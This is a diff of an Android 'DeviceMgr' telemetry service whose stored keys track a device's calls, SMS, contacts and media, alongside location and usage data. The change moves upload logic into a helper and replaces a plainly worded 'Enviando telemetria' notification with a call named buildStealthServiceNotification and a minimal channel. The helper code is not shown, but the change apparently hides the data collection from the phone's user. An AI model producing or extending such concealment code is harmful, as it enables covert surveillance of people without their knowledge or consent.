@@ -1,8 +1,6 @@
 package com.company.devicemgr.services;
 
 import android.app.Notification;
-import android.app.NotificationChannel;
-import android.app.NotificationManager;
 import android.app.AppOpsManager;
 import android.app.Service;
 import android.app.usage.UsageStats;
@@ -36,7 +34,9 @@ import androidx.core.content.ContextCompat;
 import com.company.devicemgr.utils.ApiConfig;
 import com.company.devicemgr.utils.AppRuntime;
 import com.company.devicemgr.utils.DeviceIdentity;
+import com.company.devicemgr.utils.ForegroundNotificationHelper;
 import com.company.devicemgr.utils.HttpClient;
+import com.company.devicemgr.utils.TelemetryDispatch;
 import com.company.devicemgr.utils.SupportSessionApi;
 
 import org.json.JSONArray;
@@ -68,7 +68,6 @@ public class ForegroundTelemetryService extends Service implements LocationListe
     private static final String READ_MEDIA_VIDEO_PERMISSION = "android.permission.READ_MEDIA_VIDEO";
     private static final String READ_MEDIA_AUDIO_PERMISSION = "android.permission.READ_MEDIA_AUDIO";
     private static final String READ_MEDIA_VISUAL_USER_SELECTED_PERMISSION = "android.permission.READ_MEDIA_VISUAL_USER_SELECTED";
-    private static final String KEY_PENDING_EVENTS = "pending_events_queue";
     private static final String KEY_SENT_CALL_KEYS = "sent_call_keys";
     private static final String KEY_SENT_SMS_KEYS = "sent_sms_keys";
     private static final String KEY_SENT_CONTACT_KEYS = "sent_contact_keys";
@@ -104,20 +103,11 @@ public class ForegroundTelemetryService extends Service implements LocationListe
     public void onCreate() {
         super.onCreate();
         createNotificationChannel();
-        Notification n;
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            n = new Notification.Builder(this, CHANNEL_ID)
-                    .setContentTitle("DeviceMgr")
-                    .setContentText("Enviando telemetria")
-                    .setSmallIcon(android.R.drawable.ic_menu_mylocation)
-                    .build();
-        } else {
-            n = new Notification.Builder(this)
-                    .setContentTitle("DeviceMgr")
-                    .setContentText("Enviando telemetria")
-                    .setSmallIcon(android.R.drawable.ic_menu_mylocation)
-                    .build();
-        }
+        Notification n = ForegroundNotificationHelper.buildStealthServiceNotification(
+                this,
+                CHANNEL_ID,
+                android.R.drawable.ic_menu_mylocation
+        );
         startForeground(1, n);
 
         locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
@@ -181,11 +171,7 @@ public class ForegroundTelemetryService extends Service implements LocationListe
     }
 
     private void createNotificationChannel() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel nc = new NotificationChannel(CHANNEL_ID, "DeviceMgr", NotificationManager.IMPORTANCE_LOW);
-            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
-            if (nm != null) nm.createNotificationChannel(nc);
-        }
+        ForegroundNotificationHelper.ensureMinChannel(this, CHANNEL_ID, "DeviceMgr");
     }
 
     private boolean hasPermission(String permission) {
@@ -263,13 +249,6 @@ public class ForegroundTelemetryService extends Service implements LocationListe
         return value.replaceAll("\\D+", "");
     }
 
-    private JSONObject eventBody(String type, JSONObject payload) throws Exception {
-        JSONObject body = new JSONObject();
-        body.put("type", type);
-        body.put("payload", payload);
-        return body;
-    }
-
     private void sendMetric(String metricType, String metricName, String status, Integer valueMs, Double valueNum, JSONObject context) {
         try {
             JSONObject payload = new JSONObject();
@@ -285,75 +264,12 @@ public class ForegroundTelemetryService extends Service implements LocationListe
         }
     }
 
-    private boolean postEventNow(String deviceId, String token, JSONObject body) {
-        String url = ApiConfig.api("/api/telemetry/" + deviceId);
-        try {
-            String res = HttpClient.postJson(url, body.toString(), token);
-            return res != null && res.length() > 0;
-        } catch (Exception e) {
-            Log.e(TAG, "postEventNow err", e);
-            return false;
-        }
-    }
-
-    private void enqueuePendingEvent(JSONObject body) {
-        try {
-            SharedPreferences sp = prefs();
-            JSONArray arr = new JSONArray(sp.getString(KEY_PENDING_EVENTS, "[]"));
-            JSONObject item = new JSONObject();
-            item.put("body", body);
-            item.put("queuedAt", System.currentTimeMillis());
-            arr.put(item);
-
-            JSONArray trimmed = new JSONArray();
-            int start = Math.max(0, arr.length() - 1000);
-            for (int i = start; i < arr.length(); i++) trimmed.put(arr.get(i));
-            sp.edit().putString(KEY_PENDING_EVENTS, trimmed.toString()).apply();
-        } catch (Exception e) {
-            Log.e(TAG, "enqueuePendingEvent err", e);
-        }
-    }
-
     private void flushPendingEvents(int maxItems) {
-        try {
-            SharedPreferences sp = prefs();
-            String token = currentToken();
-            String deviceId = currentDeviceId();
-            JSONArray arr = new JSONArray(sp.getString(KEY_PENDING_EVENTS, "[]"));
-            if (arr.length() == 0) return;
-
-            JSONArray remaining = new JSONArray();
-            int attempts = 0;
-            for (int i = 0; i < arr.length(); i++) {
-                JSONObject row = arr.getJSONObject(i);
-                JSONObject body = row.optJSONObject("body");
-                if (body == null) continue;
-
-                if (attempts >= maxItems) {
-                    remaining.put(row);
-                    continue;
-                }
-                attempts++;
-
-                boolean ok = postEventNow(deviceId, token, body);
-                if (!ok) {
-                    remaining.put(row);
-                }
-            }
-            sp.edit().putString(KEY_PENDING_EVENTS, remaining.toString()).apply();
-        } catch (Exception e) {
-            Log.e(TAG, "flushPendingEvents err", e);
-        }
+        TelemetryDispatch.flushPendingEvents(this, maxItems);
     }
 
     private void sendOrQueue(String type, JSONObject payload) {
-        try {
-            JSONObject body = eventBody(type, payload);
-            boolean ok = postEventNow(currentDeviceId(), currentToken(), body);
-            if (!ok) enqueuePendingEvent(body);
-        } catch (Exception e) {
-            Log.e(TAG, "sendOrQueue err", e);
-        }
+        TelemetryDispatch.sendOrQueue(this, type, payload);
     }
 
     private JSONObject syncRemoteSupportState() {
